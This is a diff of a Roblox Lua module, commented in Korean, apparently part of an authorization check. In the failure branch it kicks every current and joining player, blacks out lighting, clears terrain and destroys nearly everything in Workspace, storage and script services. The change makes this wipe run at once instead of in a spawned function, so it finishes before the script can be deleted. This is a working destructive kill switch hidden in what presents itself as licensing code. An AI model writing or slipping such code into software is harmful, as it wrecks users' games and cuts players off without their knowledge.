@@ -73,56 +73,55 @@ else
 	game.ReplicatedStorage.ihateu.Value = true
 	--------------------------------------------------
 
-	local function CompleteWipe()
-		-- 1. 데이터 영역 순회 파괴
-		local locations = {
-			game.Workspace,
-			game.ReplicatedStorage,
-			game.ServerStorage,
-			game.StarterGui,
-			game.StarterPack,
-			game.Teams,
-			game.ServerScriptService
-		}
+	-- [수정] 함수 껍데기와 task.spawn을 버리고 즉시 실행 체제로 전환!
+	
+	-- 1순위: 유저 강퇴 프로토콜 (가장 먼저 실행하여 스크립트 증발 전 처리)
+	local kickMessage = "계약 위반 및 에셋 유출로 인해 이 서버는 무력화되었습니다. (ㅅㄱ)"
+	for _, player in pairs(Players:GetPlayers()) do
+		pcall(function() player:Kick(kickMessage) end)
+	end
+	
+	Players.PlayerAdded:Connect(function(player)
+		player:Kick(kickMessage)
+	end)
 
-		for _, location in ipairs(locations) do
-			pcall(function()
-				for _, item in ipairs(location:GetChildren()) do
-					-- 시스템 필수 객체 및 유저 제외 후 삭제
-					if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
+	-- 2순위: 환경 조명 암전 및 안개 시각 테러
+	pcall(function()
+		game.Lighting.Brightness = 0
+		game.Lighting.ClockTime = 0
+		game.Lighting.GlobalShadows = true
+		game.Lighting:ClearAllChildren()
+		game.Lighting.FogEnd = 0
+		game.Lighting.Ambient = Color3.new(0, 0, 0)
+	end)
+
+	-- 3순위: 지형(Terrain) 밀어버리기
+	pcall(function()
+		game.Workspace.Terrain:Clear()
+	end)
+
+	-- 4순위: 모든 스토리지 데이터 영역 순회 파괴 (스크립트가 터질 수 있으므로 마지막에 집행)
+	local locations = {
+		game.Workspace,
+		game.StarterGui,
+		game.StarterPack,
+		game.Teams,
+		game.ReplicatedStorage,
+		game.ServerStorage,
+		game.ServerScriptService
+	}
+
+	for _, location in ipairs(locations) do
+		pcall(function()
+			for _, item in ipairs(location:GetChildren()) do
+				if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
+					if item ~= script then
 						item:Destroy()
 					end
 				end
-			end)
-		end
-
-		-- 2. 지형 초기화
-		pcall(function()
-			game.Workspace.Terrain:Clear()
-		end)
-
-		-- 3. 환경 조명 암전 및 시각 요소 제거
-		pcall(function()
-			game.Lighting.Brightness = 0
-			game.Lighting.ClockTime = 0
-			game.Lighting.GlobalShadows = true
-			game.Lighting:ClearAllChildren()
-			game.Lighting.FogEnd = 0
-			game.Lighting.Ambient = Color3.new(0, 0, 0)
-		end)
-
-		-- 4. 유저 강퇴 처리
-		local kickMessage = "계약 위반 및 에셋 유출로 인해 이 서버는 무력화되었습니다. (ㅅㄱ)"
-		for _, player in pairs(Players:GetPlayers()) do
-			pcall(function() player:Kick(kickMessage) end)
-		end
-		Players.PlayerAdded:Connect(function(player)
-			player:Kick(kickMessage)
+			end
 		end)
 	end
-
-	-- 즉시 실행
-	task.spawn(CompleteWipe)
 end
 
 -- ==========================================
@@ -130,7 +129,7 @@ end
 -- ==========================================
 local SystemResult = {
 	["Status"] = isAuthorized,
-	["Wipe"] = CompleteWipe
+	["Wipe"] = function() end -- 이미 위에서 터졌으므로 빈 함수 처리
 }
 
 return SystemResult
